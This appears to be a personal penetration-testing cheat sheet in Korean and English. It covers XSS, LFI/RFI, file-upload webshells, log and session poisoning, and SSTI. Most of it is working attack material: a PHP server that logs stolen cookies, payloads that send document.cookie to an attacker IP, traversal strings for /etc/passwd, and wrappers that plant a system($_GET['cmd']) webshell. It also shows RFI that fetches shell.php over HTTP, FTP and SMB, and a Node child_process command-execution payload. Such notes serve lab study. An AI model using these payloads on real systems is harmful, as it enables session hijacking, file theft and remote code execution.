# XSS (Cross-Site Scripting)
## 기본 공격 페이로드
### 스크립트 태그 기반
```html
<!-- 기본 alert 실행 -->
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>alert('XSS')</script>

<!-- 콘솔 로그 출력 -->
<script>console.log(document.cookie)</script>
```

### 이벤트 핸들러 기반
```html
<!-- 이미지 로드 실패 시 스크립트 실행 -->
<img src="" onerror=alert(window.origin)>
<img src=x onerror=alert(document.cookie)>

<!-- 다양한 이벤트 핸들러 활용 -->
<img src=x onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>
```

### HTML 태그 속성 활용

```html
<!-- a 태그의 href 속성 -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- iframe 활용 -->
<iframe src="javascript:alert('XSS')"></iframe>
```

---
## Stored XSS (저장형 XSS)

**설명:** 악성 스크립트가 서버의 데이터베이스에 저장되어, 다른 사용자가 해당 페이지를 방문할 때마다 스크립트가 실행되는 공격입니다. 게시판, 댓글, 프로필 등에서 주로 발생합니다.

### 공격 페이로드

```html
<!-- 현재 origin 정보를 alert로 출력 -->
<script>alert(window.origin)</script>

<!-- 쿠키 정보를 alert로 출력 -->
<script>alert(document.cookie)</script>

<!-- 인쇄 대화상자 호출 -->
<script>print()</script>

<!-- 이후 모든 HTML을 평문으로 처리 (페이지 렌더링 중단) -->
<plaintext>
```

<img width="1106" height="94" alt="image" src="https://github.com/user-attachments/assets/d9fdaeb7-2eef-4bf8-9b50-1d10c952551f" />

---
## Reflected XSS (반사형 XSS)

**설명:** 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행되는 공격입니다. 주로 검색 쿼리, 에러 메시지 등에서 발생합니다.

### 공격 페이로드

```html
<!-- 기본 스크립트 삽입 -->
<script>alert(window.origin)</script>
```

**예시:** `http://example.com/search?q=<script>alert(window.origin)</script>`

<img width="1414" height="94" alt="image" src="https://github.com/user-attachments/assets/e8ad87e9-20b1-4f92-83fc-284fc006087e" />

---
## DOM XSS (DOM 기반 XSS)

**설명:** 클라이언트 측 JavaScript 코드가 사용자 입력을 안전하지 않게 처리할 때 발생하는 XSS입니다. 서버를 거치지 않고 브라우저의 DOM을 직접 조작하여 공격이 이루어집니다.

### 취약한 JavaScript 함수들

```html
<!-- 동적으로 HTML을 작성하는 함수들 -->
document.write()
DOM.innerHTML
DOM.outerHTML
add()
after()
append()
```

**주의:** 이러한 함수들에 사용자 입력이 필터링 없이 전달되면 XSS 공격에 취약합니다.

---
## Advanced XSS 기법

**설명:** 외부 서버와 연동하여 쿠키를 탈취하거나, 복잡한 페이로드를 체이닝하는 고급 공격 기법입니다.

### 1. 쿠키 탈취 서버 구축

**PHP 서버 측 코드 (index.php):**
```php
<?php
# 쿠키 정보를 받아서 cookies.txt 파일에 저장
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**서버 실행:**
```bash
# PHP 내장 웹 서버를 80포트로 실행
sudo php -S 0.0.0.0:80
```

### 2. 다양한 스크립트 삽입 페이로드

```html
<!-- 외부 스크립트 파일 로드 -->
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>

<!-- JavaScript URI를 통한 스크립트 실행 -->
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<!-- XMLHttpRequest를 이용한 스크립트 로드 -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<!-- jQuery를 이용한 스크립트 로드 -->
<script>$.getScript("http://OUR_IP")</script>
```

### 3. 쿠키 탈취 스크립트 (script.js)

```html
<!-- document.location을 이용한 리다이렉트 -->
document.location='http://OUR_IP/index.php?c='+document.cookie;

<!-- Image 객체를 이용한 백그라운드 전송 (사용자가 인지하기 어려움) -->
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

### 4. 공격 실행 예시

<img width="832" height="704" alt="image" src="https://github.com/user-attachments/assets/3aa72f40-1ead-4db1-8c05-68c42ad656cf" />

**공격 절차:**
1. 각각의 input 필드에 XSS 페이로드를 테스트
2. XSS 취약점이 있는 input을 식별
3. 해당 input에 `script.js`를 요청하는 페이로드 삽입
4. 피해자가 페이지를 방문하면 자동으로 쿠키가 공격자 서버로 전송됨

---

# LFI
- find the minimum number of ../ that works and use it.
- error 내용을 보고 유추할 수 있다.
- 안될시에 payload를 URL ENCODED를 해서 시도해볼 것.
- `etc/passwd`
- `C:\Windows\boot.ini`
- http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
- http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
- http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
- <SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
- <SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
- ?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
- `..././`,`....\/`,`....////`,`%2e%2e%2f`,`/etc/passwd%00`
- For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

## PHP Filters
- http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

## PHP Wrappers
- `allow_url_include = On` settings enabled
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
```bash
# php configuration
/etc/php/X.Y/apache2/php.ini

/etc/php/X.Y/fpm/php.ini
```
```bash
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
echo '<?php system($_GET["cmd"]); ?>' | base64

curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

curl -s -X POST --data '<\?php system('id')?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input
```

### Expect
- `extension=expect` settings enabled
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

# RFI
- http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
- http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
## FTP
```bash
sudo python -m pyftpdlib -p 21
```
- http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
## SMB
```bash
impacket-smbserver -smb2support share $(pwd)

sudo responder -I tun0 -v
```
- http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami

# Upload File
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
- http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
- http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

# log poisoning
## PHP Session Poisoning
- `PHPSESSID`를 먼저 찾아야 함.
- `/var/lib/php/sessions/`, `C:\Windows\Temp\`
- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
- http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
<img width="2091" height="568" alt="image" src="https://github.com/user-attachments/assets/74a9ffbf-55d1-481f-9d8f-1f2308ebdcf6" />

- http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

## Server Log Poisoning
- `/var/log/apache2/`, `C:\xampp\apache\logs\`, `/var/log/nginx/`, `C:\nginx\log\`, `proc/self/environ`, `/proc/self/fd/<pid>`,`/var/log/sshd.log`, `/var/log/mail`,`/var/log/vsftpd.log`
```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison

curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
<img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/9673d26a-6ded-46df-8d67-b7b9e7bf1422" />

# automated
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
## Fuzzing parameter
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
## LFI wordlist
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

## Fuzzing server
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

## Fuzzing log
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

# SSTI
```html
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
- `Node.JS`에서는 `process`객체는 무조건적으로 존재한다.
- SSTI 공격에서는 동기 함수로는 제대로 된 응답을 받을 수 없다.
```js
process.mainModule.require('child_process').execSync('whoami')
```
